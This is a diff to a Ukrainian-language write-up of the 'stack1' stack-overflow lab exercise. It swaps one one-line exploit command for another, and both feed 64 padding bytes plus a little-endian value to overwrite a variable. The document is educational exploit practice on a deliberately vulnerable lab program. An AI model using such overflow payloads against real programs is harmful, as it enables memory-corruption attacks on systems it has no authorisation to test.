@@ -46,4 +46,4 @@ int main(int argc, char **argv)
 ```./stack1 $(python -c "print('a' * 64 + 'abcd'[::-1])")```
 
 Ну або більш універсальний спосіб (щоб не вгадувати коди необхідних символів):  
-```./stack1 $(python -c "from struct import pack; print('a' * 64 + pack('<I', 0x61626364))")```
+```./stack1 $(python -c "print('a' * 64 + '\x61\x62\x63\x64'[::-1])")```
